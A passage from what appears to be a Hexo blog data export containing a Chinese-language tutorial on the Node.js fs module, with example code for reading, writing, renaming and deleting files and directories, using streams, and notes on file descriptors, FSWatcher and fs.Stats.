if(error){\n        console.log(error);\n        return false;\n    }\n    console.log('删除目录成功');\n})\n \n \n//9. fs.unlink删除文件  \nfs.unlink('index.txt',function(error){\n    if(error){\n        console.log(error);\n        return false;\n    }\n    console.log('删除文件成功');\n})\n \n \n//10. fs.createReadStream  从文件流中读取数据，读取的文件比较大时建议用流的方式读取，文件比较大会多次读取。  \nvar fileReadStream = fs.createReadStream( 'data1.json');\nvar str = '';\nfileReadStream.on('data', (data) => {\n    console.log(\"接收到\" + data.length);   //文件比较大时，会多次读取，多次执行该回调函数  \nstr += data;\n})\nfileReadStream.on('end', () => {\n    console.log(\" --- 结束 ---\");\nconsole.log( str );\n})\nfileReadStream.on('error', (error) => {\n    console.log(error)\n})\n \n \n//11. fs.createWriteStream  写入文件流  \nvar fs = require(\"fs\");\nvar data  = \"我是从数据库获取的数据，我要保存起来\";\nvar writerStream = fs.createWriteStream('output.txt');\nwriterStream.write( data , 'UTF8' );\nwriterStream.end();  //标记文件末尾  结束写入流，释放资源  \nwriterStream.on( 'finish',  function() {\n    console.log(\"写入完成。\");\n});\nwriterStream.on( 'error',  function(error){\n    console.log(error.stack);\n});\nconsole.log(\"程序执行完毕\");\n \n \n//12. pipe 管道流  \nvar fs = require(\"fs\");\nvar readerStream = fs.createReadStream( 'input.txt');\nvar writerStream = fs.createWriteStream( 'output.txt');\nreaderStream.pipe( writerStream );\nconsole.log(\"程序执行完毕\");\n \n \n//13. fs.access 判断目录、文件是否存在(读写权限)\nvar  fs = require('fs');\nfs.access('package.json',(err)=>{\n    console.log(err ?  '目录/文件不存在': '文件存在,可以进行读写');\n});\n \n\n````\n\n---\n\n## [FS-文件系统](http://nodejs.cn/api/fs.html#fs_file_system)\nfs 模块提供了一些 API，用于以一种类似标准 POSIX 函数的方式与文件系统进行交互。\n\n**所有的文件系统操作都有异步和同步两种形式。**\n\n`异步`形式的 **最后一个`参数`都是完成时`回调函数`**。 传给回调函数的参数取决于具体方法，但`回调函数的第一个参数都会保留给异常`。 如果操作成功完成，则第一个参数会是 null 或 undefined。\n\n**同步操作**\n\n当使用`同步操作`时，任何异常都会被立即抛出，可以使用 `try/catch` 来处理异常，或让异常向上冒泡。\n\n````\nconst fs = require('fs');\n\ntry {\n  fs.unlinkSync('/tmp/hello');\n  console.log('successfully deleted /tmp/hello');\n} catch (err) {\n  // handle the error\n}\n````\n**异步操作**\n\n注意，异步的方法不能保证执行顺序。 所以下面的例子可能会出错，因为 fs.stat() 操作可能在 fs.rename() 操作之前完成。\n\n**建议**\n\n在繁忙的进程中，建议使用函数的异步版本。 同步的方法会阻塞整个进程，直到完成（停止所有连接）。\n\n### 文件路径\n大部分 `fs` 操作接受`字符串`、`Buffer`、或使用 `file:` 协议的 `URL` 对象作为文件路径。\n\n`相对路径` 会相对于 `process.cwd()` 定义的当前工作目录进行处理。\n\n使用 `Buffer` 定义的路径主要用于将文件路径处理为 opaque 字节序列的特定 POSIX 操作系统。 在这种系统上，一个文件路径可能包含使用多种字符编码的子序列。 与字符串路径一样，Buffer 路径也可以是相对的或绝对的。\n\n**注意** 在 Windows 上 Node.js 遵循 per-drive 工作目录的理念。 当使用驱动器路径不带反斜杠时可以观察到该特性。 例如，fs.readdirSync('c:\\\\') 可能会返回与 fs.readdirSync('c:') 不同的结果。 详见 [MSDN路径文档]()\n\n#### 支持 URL 对象\n\n### **文件描述符**\n在 `POSIX` 系统，`内核`为`所有进程`维护着一张当前打开着的`文件与资源表格`。 每个打开的文件都会分配一个名为`文件描述符`的数值标识。\n\n在`系统层`，所有`文件系统操作`使用这些`文件描述符`来识别与追踪每个特定的文件。 \n\nWindow 系统使用了一个`不同但概念类似`的机制来追踪资源。 \n\n为方便用户，`Node.js 抽象了不同操作系统间的差异`，为所有打开的文件分配了数值的文件描述符。\n\n`fs.open()` 方法用于分配一个新的文件描述符。 一旦分配了，文件描述符可用于`读取`数据、`写入`数据、或`查看`文件信息。\n\n`大多数操作系统`会`限制打开的文件描述符的数量`，所以当`操作完成时需关闭描述符`。 如果不这样做会导致`内存泄漏`，最终造成应用奔溃。\n\n### 线程池的使用\n注意，所有文件系统 API 中，除了 `fs.FSWatcher()` 和那些显式同步的方法之外，都使用了 `libuv` 的线程池，这对于某些应用程序可能会产生出乎意料问题和负面的性能影响，详见 [`UV_THREADPOOL_SIZE`](http://nodejs.cn/api/cli.html#cli_uv_threadpool_size_size) 文档。\n\n# fs.FSWatcher 类\n成功调用 `fs.watch()` 方法会返回一个新的 `fs.FSWatcher` 对象。\n\n所有 `fs.FSWatcher` 对象都是 [`EventEmitter`](http://nodejs.cn/api/events.html) 的，每当监视的文件被修改时会触发 `'change'` 事件。\n\n## 'change' 事件\n+ `eventType` \\<string> 发生的变化事件的类型。\n+ `filename` \\<string> | \\<Buffer> 变化的文件名（如果是相关的或有效的）。\n\n当被监视的目录或文件有变化时触发。 详见 `fs.watch()`\n\n## 'close' 事件\n当 `watcher` 停止监视文件变化时触发。 关闭的 `fs.FSWatcher` 对象在事件处理函数中不再可用。\n\n## 'error' 事件\n当监视文件发生错误时触发。 \n\n发生错误的 `fs.FSWatcher` 对象在事件处理函数中`不再可用`。\n\n## watcher.close()\n`fs.FSWatcher` `停止监视`文件的变化。 \n\n一旦停止，`fs.FSWatcher` 对象将`不再可用`。\n\n# fs.ReadStream 类\n成功调用 `fs.createReadStream()` 会返回一个新的 `fs.ReadStream` 对象。\n\n`fs.ReadStream` 对象都是可读流。\n\n## 'close' 事件\n当 `fs.ReadStream` 底层的文件描述符被关闭时触发。\n\n## 'open' 事件\n\n## 'ready' 事件\n\n## readStream.bytesRead\n已读取的字节数。\n\n## readStream.path\n\n# fs.Stats 类\n`fs.Stats` 对象提供了一个文件的信息。\n\n## stats.isBlockDevice()\n如果 `fs.Stats` 对象表示一个块设备，则返回 true 。\n\n## stats.isCharacterDevice()\n如果 `fs.Stats` 对象表示一个字符设备，则返回 true 。\n\n## stats.isDirectory()\n如果 `fs.Stats` 对象表示一个文件系统目录，则返回 true 。\n\n## stats.isFIFO()\n如果 `fs.Stats` 对象表示一个`先进先出 (FIFO) 管道`，则返回 true 。\n\nFIFO( First Input First Output)简单说就是指先进先出。[百度百科: FIFO存储器](https://baike.baidu.com/item/FIFO存储器/4530258?fr=aladdin)\n\n## stats.isFile()\n如果 `fs.Stats` 对象表示一个普通文件，则返回 `true` 。\n\n## stats.isSocket()\n如果 `fs.Stats` 对象表示一个 `socket`，则返回 `true` 。\n\n## stats.isSymbolicLink()\n如果 `fs.Stats` 对象表示一个符号链接，则返回 `true` 。\n\n该方法只在使用 `fs.lstat()` 时有效。\n\n| type | description |\n| :--: |   :-----   |\n| stats.dev | 包含文件的设备的数值型标识。 |\n| stats.ino | 文件系统特定的文件索引节点数值。 |\n| stats.mode | 表示文件类型与模式的位域。 |\n| stats.nlink | 文件的硬链接数量。 |\n| stats.uid | 文件拥有者的数值型用户标识。 |\n| stats.gid | 拥有文件的群组的数值型群组标识。 |\n| stats.rdev |  |\n|  |  |\n\n## \n\n\n## \n\n\n\n\n\n","source":"_posts/NodeJS/Node-js-FS模块.md","raw":"---\ntitle: FS模块\ndate: 2018-07-05 14:47:46\ntags: FileSystem\ncategories: Node FS\n---\n## [Node.js fs模块(文件模块) 创建、删除目录(文件) 读取写入文件流](https://blog.csdn.net/houyanhua1/article/details/79443987)\n\n````\n/* \n 1. fs.stat  检测是文件还是目录(目录 文件是否存在) \n 2. fs.mkdir  创建目录 （创建之前先判断是否存在） \n 3. fs.writeFile  写入文件(文件不存在就创建,但不能创建目录) \n 4. fs.appendFile 写入追加文件 \n 5. fs.readFile 读取文件 \n 6. fs.readdir 读取目录 \n 7. fs.rename 重命名 \n 8. fs.rmdir  删除目录 \n 9. fs.unlink 删除文件 \n 10. fs.createReadStream('') 从文件流中读取数据\n 11. fs.createWriteStream  写入文件流\n 12. pipe 管道流 \n 13. fs.access 判断目录、文件是否存在(读写权限)\n*/\n \nvar fs=require('fs');   //fs是node.js的核心模块，不用下载安装，可以直接引入  \n \n//1. fs.stat  检测是文件还是目录  fs.statSync()同步获取stats对象,通过返回值接收。\nfs.stat('html',function(error,stats){\n    if(error){\n        console.log(error);\n        return false;\n    }\n    console.log('文件：'+stats.isFile());\n    console.log('目录：'+stats.isDirectory());\n})\n \n \n//2. fs.mkdir  创建目录  \nfs.mkdir('css',function(error){\n    if(error){\n        console.log(error);\n        return false;\n    }\n    console.log('创建目录成功');\n})\n \n \n//3. fs.writeFile  写入文件（会覆盖之前的内容）（文件不存在就创建）  utf8参数可以省略  \nfs.writeFile('123.txt','你好nodejs 覆盖','utf8',function(error){\n    if(error){\n        console.log(error);\n        return false;\n    }\n    console.log('写入成功');\n})\n \n \n//4. fs.appendFile 追加文件  \nfs.appendFile('123.txt','这是写入的内容\\n',function(error){\n    if(error){\n        console.log(error);\n        return false;\n    }\n    console.log('写入成功');\n})\n \n \n//5.fs.readFile 读取文件  \nfs.readFile('123.txt',function(error,data){\n    if(error){\n        console.log(error);\n        return false;\n    }\n    //console.log(data);  //data是读取的十六进制的数据。  也可以在参数中加入编码格式\"utf8\"来解决十六进制的问题;\n    console.log(data.toString());  //读取出所有行的信息  \n})\n \n \n//6.fs.readdir 读取目录下第一级内容  把目录下面的文件和文件夹都获取到。  \nfs.readdir('html',function(error,data){\n    if(error){\n        console.log(error);\n        return false;\n    }\n    console.log(data);  //data是数组类型，包含文件夹以及文件的名字(只有第一级目录内容)。拿到一个文件夹下面的所有目录  \n})\n \n \n//7.fs.rename 重命名  1.改名  2.剪切文件(移动)  \nfs.rename('html/index.html','html/news.html',function(error){\n    if(error){\n        console.log(error);\n        return false;\n    }\n    console.log('修改名字成功');\n})\n \n \n//8. fs.rmdir  删除目录   rmdir 这个方法只能删除目录，不能删除文件  \nfs.rmdir('abc目录',function(error){\n    if(error){\n        console.log(error);\n        return false;\n    }\n    console.log('删除目录成功');\n})\n \n \n//9. fs.unlink删除文件  \nfs.unlink('index.txt',function(error){\n    if(error){\n        console.log(error);\n        return false;\n    }\n    console.log('删除文件成功');\n})\n \n \n//10. fs.createReadStream  从文件流中读取数据，读取的文件比较大时建议用流的方式读取，文件比较大会多次读取。  \nvar fileReadStream = fs.createReadStream( 'data1.json');\nvar str = '';\nfileReadStream.on('data', (data) => {\n    console.log(\"接收到\" + data.length);   //文件比较大时，会多次读取，多次执行该回调函数  \nstr += data;\n})\nfileReadStream.on('end', () => {\n    console.log(\" --- 结束 ---\");\nconsole.log( str );\n})\nfileReadStream.on('error', (error) => {\n    console.log(error)\n})\n \n \n//11. fs.createWriteStream  写入文件流  \nvar fs = require(\"fs\");\nvar data  = \"我是从数据库获取的数据，我要保存起来\";\nvar writerStream = fs.createWriteStream('output.txt');\nwriterStream.write( data , 'UTF8' );\nwriterStream.end();  //标记文件末尾  结束写入流，释放资源  \nwriterStream.on( 'finish',  function() {\n    console.log(\"写入完成。\");\n});\nwriterStream.on( 'error',  function(error){\n    console.log(error.stack);\n});\nconsole.log(\"程序执行完毕\");\n \n \n//12. pipe 管道流  \nvar fs = require(\"fs\");\nvar readerStream = fs.createReadStream( 'input.txt');\nvar writerStream = fs.createWriteStream( 'output.txt');\nreaderStream.pipe( writerStream );\nconsole.log(\"程序执行完毕\");\n \n \n//13. fs.access 判断目录、文件是否存在(读写权限)\nvar  fs = require('fs');\nfs.access('package.json',(err)=>{\n    console.log(err ?  '目录/文件不存在': '文件存在,可以进行读写');\n});\n \n\n````\n\n---\n\n## [FS-文件系统](http://nodejs.cn/api/fs.html#fs_file_system)\nfs 模块提供了一些 API，用于以一种类似标准 POSIX 函数的方式与文件系统进行交互。\n\n**所有的文件系统操作都有异步和同步两种形式。**\n\n`异步`形式的 **最后一个`参数`都是完成时`回调函数`**。 传给回调函数的参数取决于具体方法，但`回调函数的第一个参数都会保留给异常`。 如果操作成功完成，则第一个参数会是 null 或 undefined。\n\n**同步操作**\n\n当使用`同步操作`时，任何异常都会被立即抛出，可以使用 `try/catch` 来处理异常，或让异常向上冒泡。\n\n````\nconst fs = require('fs');\n\ntry {\n  fs.unlinkSync('/tmp/hello');\n  console.log('successfully deleted /tmp/hello');\n} catch (err) {\n  // handle the error\n}\n````\n**异步操作**\n\n注意，异步的方法不能保证执行顺序。 所以下面的例子可能会出错，因为 fs.stat() 操作可能在 fs.rename() 操作之前完成。\n\n**建议**\n\n在繁忙的进程中，建议使用函数的异步版本。 同步的方法会阻塞整个进程，直到完成（停止所有连接）。\n\n### 文件路径\n大部分 `fs` 操作接受`字符串`、`Buffer`、或使用 `file:` 协议的 `URL` 对象作为文件路径。\n\n`相对路径` 会相对于 `process.cwd()` 定义的当前工作目录进行处理。\n\n使用 `Buffer` 定义的路径主要用于将文件路径处理为 opaque 字节序列的特定 POSIX 操作系统。 在这种系统上，一个文件路径可能包含使用多种字符编码的子序列。 与字符串路径一样，Buffer 路径也可以是相对的或绝对的。\n\n**注意** 在 Windows 上 Node.js 遵循 per-drive 工作目录的理念。 当使用驱动器路径不带反斜杠时可以观察到该特性。 例如，fs.readdirSync('c:\\\\') 可能会返回与 fs.readdirSync('c:') 不同的结果。 详见 [MSDN路径文档]()\n\n#### 支持 URL 对象\n\n### **文件描述符**\n在 `POSIX` 系统，`内核`为`所有进程`维护着一张当前打开着的`文件与资源表格`。 每个打开的文件都会分配一个名为`文件描述符`的数值标识。\n\n在`系统层`，所有`文件系统操作`使用这些`文件描述符`来识别与追踪每个特定的文件。 \n\nWindow 系统使用了一个`不同但概念类似`的机制来追踪资源。 \n\n为方便用户，`Node.js 抽象了不同操作系统间的差异`，为所有打开的文件分配了数值的文件描述符。\n\n`fs.open()` 方法用于分配一个新的文件描述符。 一旦分配了，文件描述符可用于`读取`数据、`写入`数据、或`查看`文件信息。\n\n`大多数操作系统`会`限制打开的文件描述符的数量`，所以当`操作完成时需关闭描述符`。 如果不这样做会导致`内存泄漏`，最终造成应用奔溃。\n\n### 线程池的使用\n注意，所有文件系统 API 中，除了 `fs.FSWatcher()` 和那些显式同步的方法之外，都使用了 `libuv` 的线程池，这对于某些应用程序可能会产生出乎意料问题和负面的性能影响，详见 [`UV_THREADPOOL_SIZE`](http://nodejs.cn/api/cli.html#cli_uv_threadpool_size_size) 文档。\n\n# fs.FSWatcher 类\n成功调用 `fs.watch()` 方法会返回一个新的 `fs.FSWatcher` 对象。\n\n所有 `fs.FSWatcher` 对象都是 [`EventEmitter`](http://nodejs.cn/api/events.html) 的，每当监视的文件被修改时会触发 `'change'` 事件。\n\n## 'change' 事件\n+ `eventType` \\<string> 发生的变化事件的类型。\n+ `filename` \\<string> | \\<Buffer> 变化的文件名（如果是相关的或有效的）。\n\n当被监视的目录或文件有变化时触发。 详见 `fs.watch()`\n\n## 'close' 事件\n当 `watcher` 停止监视文件变化时触发。 关闭的 `fs.FSWatcher` 对象在事件处理函数中不再可用。\n\n## 'error' 事件\n当监视文件发生错误时触发。 \n\n发生错误的 `fs.FSWatcher` 对象在事件处理函数中`不再可用`。\n\n## watcher.close()\n`fs.FSWatcher` `停止监视`文件的变化。 \n\n一旦停止，`fs.FSWatcher` 对象将`不再可用`。\n\n# fs.ReadStream 类\n成功调用 `fs.createReadStream()` 会返回一个新的 `fs.ReadStream` 对象。\n\n`fs.ReadStream` 对象都是可读流。\n\n## 'close' 事件\n当 `fs.ReadStream` 底层的文件描述符被关闭时触发。\n\n## 'open' 事件\n\n## 'ready' 事件\n\n## readStream.bytesRead\n已读取的字节数。\n\n## readStream.path\n\n# fs.Stats 类\n`fs.Stats` 对象提供了一个文件的信息。\n\n## stats.isBlockDevice()\n如果 `fs.Stats` 对象表示一个块设备，则返回 true 。\n\n## stats.isCharacterDevice()\n如果 `fs.Stats` 对象表示一个字符设备，则返回 true 。\n\n## stats.isDirectory()\n如果 `fs.Stats` 对象表示一个文件系统目录，则返回 true 。\n\n## stats.isFIFO()\n如果 `fs.Stats` 对象表示一个`先进先出 (FIFO) 管道`，则返回 true 。\n\nFIFO( First Input First Output)简单说就是指先进先出。[百度百科: FIFO存储器](https://baike.baidu.com/item/FIFO存储器/4530258?fr=aladdin)\n\n## stats.isFile()\n如果 `fs.Stats` 对象表示一个普通文件，则返回 `true` 。\n\n## stats.isSocket()\n如果 `fs.Stats` 对象表示一个 `socket`，则返回 `true` 。\n\n## stats.isSymbolicLink()\n如果 `fs.Stats` 对象表示一个符号链接，则返回 `true` 。\n\n该方法只在使用 `fs.lstat()` 时有效。\n\n| type | description |\n| :--: |   :-----   |\n| stats.dev | 包含文件的设备的数值型标识。 |\n| stats.ino | 文件系统特定的文件索引节点数值。 |\n| stats.mode | 表示文件类型与模式的位域。 |\n| stats.nlink | 文件的硬链接数量。 |\n| stats.uid | 文件拥有者的数值型用户标识。 |\n| stats.gid | 拥有文件的群组的数值型群组标识。 |\n| stats.rdev |  |\n|  |  |\n\n## \n\n\n## \n\n\n\n\n\n","slug":"NodeJS/Node-js-FS模块","published":1,"updated":"2018-07-06T02:23:37.005Z","_id":"cjj87i2a50039b8xjitbwjzy0","comments":1,"layout":"post","photos":[],"link":"","content":"<h2 id=\"Node-js-fs模块-文件模块-创建、删除目录-文件-读取写入文件流\"><a href=\"#Node-js-fs模块-文件模块-创建、删除目录-文件-读取写入文件流\" class=\"headerlink\" title=\"Node.js fs模块(文件模块) 创建、删除目录(文件) 读取写入文件流\"></a><a href=\"https://blog.csdn.net/houyanhua1/article/details/79443987\" target=\"_blank\" rel=\"noopener\">Node.js fs模块(文件模块) 创建、删除目录(文件) 读取写入文件流</a></h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/* </span><br><span class=\"line\"> 1. fs.stat  检测是文件还是目录(目录 文件是否存在) </span><br><span class=\"line\"> 2. fs.mkdir  创建目录 （创建之前先判断是否存在） </span><br><span class=\"line\"> 3. fs.writeFile  写入文件(文件不存在就创建,但不能创建目录) </span><br><span class=\"line\"> 4. fs.appendFile 写入追加文件 </span><br><span class=\"line\"> 5. fs.readFile 读取文件 </span><br><span class=\"line\"> 6. fs.readdir 读取目录 </span><br><span class=\"line\"> 7. fs.rename 重命名 </span><br><span class=\"line\"> 8. fs.rmdir  删除目录 </span><br><span class=\"line\"> 9. fs.unlink 删除文件 </span><br><span class=\"line\"> 10. fs.createReadStream(&apos;&apos;) 从文件流中读取数据</span><br><span class=\"line\"> 11. fs.createWriteStream  写入文件流</span><br><span class=\"line\"> 12. pipe 管道流 </span><br><span class=\"line\"> 13. fs.access 判断目录、文件是否存在(读写权限)</span><br><span class=\"line\">*/</span><br><span class=\"line\"> </span><br><span class=\"line\">var fs=require(&apos;fs&apos;);   //fs是node.js的核心模块，不用下载安装，可以直接引入  </span><br><span class=\"line\"> </span><br><span class=\"line\">//1. fs.stat  检测是文件还是目录  fs.statSync()同步获取stats对象,通过返回值接收。</span><br><span class=\"line\">fs.stat(&apos;html&apos;,function(error,stats)&#123;</span><br><span class=\"line\">    if(error)&#123;</span><br><span class=\"line\">        console.log(error);</span><br><span class=\"line\">        return false;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    console.log(&apos;文件：&apos;+stats.isFile());</span><br><span class=\"line\">    console.log(&apos;目录：&apos;+stats.isDirectory());</span><br><span class=\"line\">&#125;)</span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\">//2. fs.mkdir  创建目录  </span><br><span class=\"line\">fs.mkdir(&apos;css&apos;,function(error)&#123;</span><br><span class=\"line\">    if(error)&#123;</span><br><span class=\"line\">        console.log(error);</span><br><span class=\"line\">        return false;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    console.log(&apos;创建目录成功&apos;);</span><br><span class=\"line\">&#125;)</span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\">//3. fs.writeFile  写入文件（会覆盖之前的内容）（文件不存在就创建）  utf8参数可以省略  </span><br><span class=\"line\">fs.writeFile(&apos;123.txt&apos;,&apos;你好nodejs 覆盖&apos;,&apos;utf8&apos;,function(error)&#123;</span><br><span class=\"line\">    if(error)&#123;</span><br><span class=\"line\">        console.log(error);</span><br><span class=\"line\">        return false;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    console.log(&apos;写入成功&apos;);</span><br><span class=\"line\">&#125;)</span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\">//4. fs.appendFile 追加文件  </span><br><span class=\"line\">fs.appendFile(&apos;123.txt&apos;,&apos;这是写入的内容\\n&apos;,function(error)&#123;</span><br><span class=\"line\">    if(error)&#123;</span><br><span class=\"line\">        console.log(error);</span><br><span class=\"line\">        return false;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    console.log(&apos;写入成功&apos;);</span><br><span class=\"line\">&#125;)</span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\">//5.fs.readFile 读取文件  </span><br><span class=\"line\">fs.readFile(&apos;123.txt&apos;,function(error,data)&#123;</span><br><span class=\"line\">    if(error)&#123;</span><br><span class=\"line\">        console.log(error);</span><br><span class=\"line\">        return false;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    //console.log(data);  //data是读取的十六进制的数据。  也可以在参数中加入编码格式&quot;utf8&quot;来解决十六进制的问题;</span><br><span class=\"line\">    console.log(data.toString());  //读取出所有行的信息  </span><br><span class=\"line\">&#125;)</span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\">//6.fs.readdir 读取目录下第一级内容  把目录下面的文件和文件夹都获取到。  </span><br><span class=\"line\">fs.readdir(&apos;html&apos;,function(error,data)&#123;</span><br><span class=\"line\">    if(error)&#123;</span><br><span class=\"line\">        console.log(error);</span><br><span class=\"line\">        return false;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    console.log(data);  //data是数组类型，包含文件夹以及文件的名字(只有第一级目录内容)。拿到一个文件夹下面的所有目录  </span><br><span class=\"line\">&#125;)</span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\">//7.fs.rename 重命名  1.改名  2.剪切文件(移动)  </span><br><span class=\"line\">fs.rename(&apos;html/index.html&apos;,&apos;html/news.html&apos;,function(error)&#123;</span><br><span class=\"line\">    if(error)&#123;</span><br><span class=\"line\">        console.log(error);</span><br><span class=\"line\">        return false;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    console.log(&apos;修改名字成功&apos;);</span><br><span class=\"line\">&#125;)</span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\">//8. fs.rmdir  删除目录   rmdir 这个方法只能删除目录，不能删除文件  </span><br><span class=\"line\">fs.rmdir(&apos;abc目录&apos;,function(error)&#123;</span><br><span class=\"line\">    if(error)&#123;</span><br><span class=\"line\">        console.log(error);</span><br><span class=\"line\">        return false;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    console.log(&apos;删除目录成功&apos;);</span><br><span class=\"line\">&#125;)</span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\">//9. fs.unlink删除文件  </span><br><span class=\"line\">fs.unlink(&apos;index.txt&apos;,function(error)&#123;</span><br><span class=\"line\">    if(error)&#123;</span><br><span class=\"line\">        console.log(error);</span><br><span class=\"line\">        return false;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    console.log(&apos;删除文件成功&apos;);</span><br><span class=\"line\">&#125;)</span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\">//10. fs.createReadStream  从文件流中读取数据，读取的文件比较大时建议用流的方式读取，文件比较大会多次读取。  </span><br><span class=\"line\">var fileReadStream = fs.createReadStream( &apos;data1.json&apos;);</span><br><span class=\"line\">var str = &apos;&apos;;</span><br><span class=\"line\">fileReadStream.on(&apos;data&apos;, (data) =&gt; &#123;</span><br><span class=\"line\">    console.log(&quot;接收到&quot; + data.length);   //文件比较大时，会多次读取，多次执行该回调函数  </span><br><span class=\"line\">str += data;</span><br><span class=\"line\">&#125;)</span><br><span class=\"line\">fileReadStream.on(&apos;end&apos;, () =&gt; &#123;</span><br><span class=\"line\">    console.log(&quot; --- 结束 ---&quot;);</span><br><span class=\"line\">console.log( str );</span><br><span class=\"line\">&#125;)</span><br><span class=\"line\">fileReadStream.on(&apos;error&apos;, (error) =&gt; &#123;</span><br><span class=\"line\">    console.log(error)</span><br><span class=\"line\">&#125;)</span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\">//11. fs.createWriteStream  写入文件流  </span><br><span class=\"line\">var fs = require(&quot;fs&quot;);</span><br><span class=\"line\">var data  = &quot;我是从数据库获取的数据，我要保存起来&quot;;</span><br><span class=\"line\">var writerStream = fs.createWriteStream(&apos;output.txt&apos;);</span><br><span class=\"line\">writerStream.write( data , &apos;UTF8&apos; );</span><br><span class=\"line\">writerStream.end();  //标记文件末尾  结束写入流，释放资源  </span><br><span class=\"line\">writerStream.on( &apos;finish&apos;,  function() &#123;</span><br><span class=\"line\">    console.log(&quot;写入完成。&quot;);</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\">writerStream.on( &apos;error&apos;,  function(error)&#123;</span><br><span class=\"line\">    console.log(error.stack);</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\">console.log(&quot;程序执行完毕&quot;);</span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\">//12. pipe 管道流  </span><br><span class=\"line\">var fs = require(&quot;fs&quot;);</span><br><span class=\"line\">var 